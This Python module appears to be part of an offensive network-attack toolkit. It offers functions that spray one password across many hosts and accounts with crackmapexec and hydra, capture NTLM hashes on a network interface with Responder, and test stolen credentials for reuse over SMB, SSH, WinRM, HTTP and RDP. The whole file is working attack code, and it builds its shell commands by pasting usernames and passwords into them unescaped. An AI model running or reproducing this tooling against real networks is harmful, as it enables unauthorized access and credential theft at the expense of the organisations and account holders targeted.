"""Internal credential spraying and hash capture."""

from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)


@dataclass
class SprayResult:
    host: str
    username: str
    success: bool
    service: str = ""
    error: str = ""


async def spray_passwords(
    hosts: list[str],
    usernames: list[str],
    password: str,
    service: str = "smb",
    timeout: int = 300,
) -> list[SprayResult]:
    """Test one password across many hosts and accounts."""
    results = []

    for host in hosts:
        for username in usernames:
            try:
                if service == "smb":
                    cmd = f"crackmapexec smb {host} -u {username} -p {password} --continue-on-success"
                elif service == "ssh":
                    cmd = f"crackmapexec ssh {host} -u {username} -p {password} --continue-on-success"
                elif service == "winrm":
                    cmd = f"crackmapexec winrm {host} -u {username} -p {password} --continue-on-success"
                elif service == "http":
                    cmd = f"hydra -l {username} -p {password} {host} http-get / -t 1 -f"
                else:
                    continue

                proc = await asyncio.create_subprocess_shell(
                    cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=30)
                output = stdout.decode("utf-8", errors="replace")

                success = any(marker in output.lower() for marker in [
                    "pwn3d",
                    "success",
                    "200 ok",
                    "authenticated",
                ])

                results.append(SprayResult(
                    host=host,
                    username=username,
                    success=success,
                    service=service,
                ))

                if success:
                    logger.info("Credentials valid: %s@%s (%s)", username, host, service)

            except asyncio.TimeoutError:
                results.append(SprayResult(
                    host=host, username=username, success=False,
                    service=service, error="timeout",
                ))
            except Exception as exc:
                results.append(SprayResult(
                    host=host, username=username, success=False,
                    service=service, error=str(exc)[:100],
                ))

    valid = [r for r in results if r.success]
    logger.info("Spray complete: %d/%d valid credentials found", len(valid), len(results))
    return results


async def capture_ntlm_hashes(interface: str = "eth0", duration: int = 60) -> dict[str, Any]:
    """Capture NTLM hashes using Responder."""
    result = {
        "success": False,
        "hashes": [],
        "method": "responder",
    }

    cmd = f"timeout {duration} responder -I {interface} -wrf --analyze 2>&1 || true"

    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=duration + 10)
        output = stdout.decode("utf-8", errors="replace")

        # Parse captured hashes
        for line in output.splitlines():
            if "NTLMv2" in line or "NTLMv1" in line:
                result["hashes"].append(line.strip())
                result["success"] = True

        if result["hashes"]:
            logger.info("Captured %d NTLM hashes", len(result["hashes"]))

    except Exception as exc:
        logger.warning("Hash capture failed: %s", exc)

    return result


async def test_credential_reuse(
    credential: dict[str, str],
    targets: list[dict[str, str]],
) -> list[SprayResult]:
    """Test if a credential works across multiple services."""
    results = []
    username = credential.get("username", "")
    password = credential.get("password", "")

    if not username or not password:
        return results

    for target in targets:
        host = target.get("host", "")
        service = target.get("service", "smb")

        try:
            if service == "smb":
                cmd = f"crackmapexec smb {host} -u {username} -p {password}"
            elif service == "ssh":
                cmd = f"sshpass -p '{password}' ssh {username}@{host} 'echo success'"
            elif service == "winrm":
                cmd = f"crackmapexec winrm {host} -u {username} -p {password}"
            elif service == "http":
                cmd = f"curl -s -o /dev/null -w '%{{http_code}}' -u {username}:{password} http://{host}/"
            elif service == "rdp":
                cmd = f"xfreerdp /u:{username} /p:{password} /v:{host} /cert:ignore /f"
            else:
                continue

            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
            output = stdout.decode("utf-8", errors="replace")

            success = any(marker in output.lower() for marker in [
                "pwn3d", "success", "200", "authenticated", "access granted",
            ])

            results.append(SprayResult(
                host=host, username=username, success=success, service=service,
            ))

        except Exception as exc:
            results.append(SprayResult(
                host=host, username=username, success=False,
                service=service, error=str(exc)[:100],
            ))

    valid = [r for r in results if r.success]
    logger.info("Credential reuse: %d/%d targets accepted the credential", len(valid), len(results))
    return results
